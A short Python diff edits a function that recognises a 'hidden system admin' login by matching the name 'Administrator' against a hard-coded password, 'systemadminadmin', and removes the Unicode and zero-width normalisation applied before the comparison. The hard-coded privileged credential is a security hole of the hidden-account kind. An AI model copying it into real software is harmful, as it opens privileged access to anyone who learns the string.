@@ -70,8 +70,7 @@ def find_member_by_login_name(items: list[dict[str, Any]], name: str, part: str 
 
 def is_hidden_system_admin_login(login: Any) -> bool:
     login_name = compact_member_name(getattr(login, "name", ""))
-    login_password = unicodedata.normalize("NFKC", str(getattr(login, "password", "") or ""))
-    login_password = re.sub(r"[\u200b-\u200d\u2060\ufeff]", "", login_password).strip()
+    login_password = str(getattr(login, "password", "") or "")
     return login_name == compact_member_name("Administrator") and login_password == "systemadminadmin"
 
 
